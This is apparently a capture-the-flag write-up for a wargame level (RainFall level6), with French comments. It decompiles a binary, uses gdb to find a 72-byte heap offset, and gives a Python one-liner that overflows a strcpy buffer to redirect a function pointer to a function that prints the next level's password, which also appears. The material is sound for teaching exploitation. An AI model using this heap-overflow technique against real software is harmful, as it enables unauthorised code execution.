``` c

void n(void)

{
  system("/bin/cat /home/user/level7/.pass");
  return;
}



void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)

{
  puts("Nope");
  return;
}



void main(undefined4 param_1,int param_2)

{
  char *__dest;
  undefined4 *puVar1;
  
  __dest = malloc(0x40);                                    // == 64
  puVar1 = malloc(4);
  *puVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (*(code *)*puVar1)();
  return;
}
```



``` bash

(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:	    push   ebp
   0x0804847d <+1>:	    mov    ebp,esp
   0x0804847f <+3>:	    and    esp,0xfffffff0
   0x08048482 <+6>:	    sub    esp,0x20
   0x08048485 <+9>:	    mov    DWORD PTR [esp],0x40      # dest
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>        # eax = 804A008
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax      # adresse de dest = esp+0x1c
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4           # var
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>        # eax = 0x804a050
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax      # adresse de var a esp+0x18
   0x080484a5 <+41>:	mov    edx,0x8048468                 # REGARDER la valeur == m
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]      # on met adresse de var dans eax
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx           # laddr du malloc pointe vers m                  
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    
End of assembler dump.


(gdb) b *main+46
Breakpoint 2 at 0x80484aa

(gdb) x/10x $edx
0x8048468 <m>:	0x55	0x89	0xe5	0x83	0xec	0x18	0xc7	0x04

(gdb) b *main+78
Breakpoint 1 at 0x80484ca
(gdb) run aaaaaaaaaaaaaa
Starting program: /home/user/level6/level6 aaaaaaaaaaaaaa

(gdb) x/14x $eax
0x804a008:	0x61	0x61	0x61	0x61	0x61	0x61	0x61	0x61
0x804a010:	0x61	0x61	0x61	0x61	0x61	0x61

(gdb) x/14x $esp+0x1c
0xbffff71c:	0x08	0xa0	0x04	0x08	0xe0	0x84	0x04	0x08
0xbffff724:	0x00	0x00	0x00	0x00	0x00	0x00


(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret    
End of assembler dump.
```
804a050 - 804a008 = 0x48 == 72
=> trouver offset entre malloc de dest et de n


``` bash
level6@RainFall:~$ ./level6 $(python2 -c 'print("A" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```